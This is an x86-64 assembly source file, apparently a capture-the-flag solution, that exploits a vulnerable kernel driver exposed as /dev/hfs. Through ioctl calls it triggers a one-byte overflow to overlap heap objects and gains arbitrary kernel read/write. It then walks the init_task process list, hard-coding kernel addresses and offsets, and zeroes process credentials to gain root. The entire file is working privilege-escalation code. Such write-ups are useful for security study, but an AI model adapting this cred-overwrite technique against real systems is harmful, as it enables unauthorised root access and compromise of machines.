[BITS 64]
; nasm -f elf64 pwn.S -o pwn.o && ld pwn.o -o pwn

global _start

section .text

_start:
	mov rdi, dev			; /dev/hfs
	mov rsi, 2
	mov rdx, 0
	mov rax, 2
	syscall				; open( "/dev/hfs" , O_RDWR , 0 ) = 3

	mov qword [arg], 0 	 	; id
	mov qword [arg+8], 0x20 	; size
	call create

        mov qword [arg], 1        	; id
        mov qword [arg+8], 0x20      	; size
	call create

	mov qword [arg], 1              ; id
        mov qword [arg+8], 0x21         ; size
        mov qword [arg+0x10], pwn	; payload
        call write

	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        call create			; Overlap!


	mov qword [i], 0
	mov qword [base], 0xffffffff81a1b4c0	; init_task
	add qword [base], 0x1d0			; init_task->tasks
						; struct list_head tasks;
loop:
	mov rbx, qword [base]
	sub rbx, 0x1d0
	add rbx, 0x3c0			; &(p->cred)      const struct cred __rcu *cred;
	mov qword [fake + 8], rbx
        call dump 			; a = &(p->cred)

	mov rbx, qword [a]		; rbx = p->cred
	add rbx, 4
	mov qword [fake + 8], rbx	


	mov qword [fake + 16], 0x20
	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+0x10], fake      ; fake obj
        call write

        mov qword [arg], 0              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+16], cred        ; overwrite p->cred + 4
        call write


	mov qword [fake + 16], 8

	mov rbx, qword [base]
	mov qword [fake + 8], rbx
	call dump 			; a = &(p->tasks.next)

	mov rbx, qword [a]
	mov qword [base], rbx		; [base] = p->tasks.next

	add qword [i], 1
	cmp qword [i], 25		; make sure to traverse full circular linked list
	jne loop
exit:
	xor rdi, rdi
	mov rax, 0x3c
	syscall


dump:
	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+0x10], fake      ; fake obj
	call write

	mov qword [arg], 0              ; id
        mov qword [arg+8], 8		; size
	mov qword [arg+16], a		; copy to a
        call read
	ret
set:
	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+0x10], fake      ; fake obj
        call write

        mov qword [arg], 0              ; id
        mov qword [arg+8], 8         	; size
        mov qword [arg+16], a           ; copy from a
        call write
        ret

print_a:
	mov rdi, 1
	mov rsi, a
        mov rdx, 9
        mov rax, 1
        syscall
	ret

create:
	mov rdi, 3
	mov rsi, 0xABCD0001
	mov rdx, arg
	mov rax, 16
	syscall
	ret
delete:
	mov rdi, 3
	mov rsi, 0xABCD0002
	mov rdx, arg
	mov rax, 16
	syscall
	ret
read:
	mov rdi, 3
	mov rsi, 0xABCD0003
	mov rdx, arg
	mov rax, 16
	syscall
	ret
write:
	mov rdi, 3
	mov rsi, 0xABCD0004
	mov rdx, arg
	mov rax, 16
	syscall
	ret


section .data

pwn:	db	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" , 0x40 , 0
fake:	dq	0 , 0 , 8
arg:	dq	0 , 0 , 0
cred:	dq	0 , 0 , 0 , 0

a:	dq	0 , 0xa
i:	dq	0
base:	dq	0 , 0xa

dev:    db      "/dev/hfs",0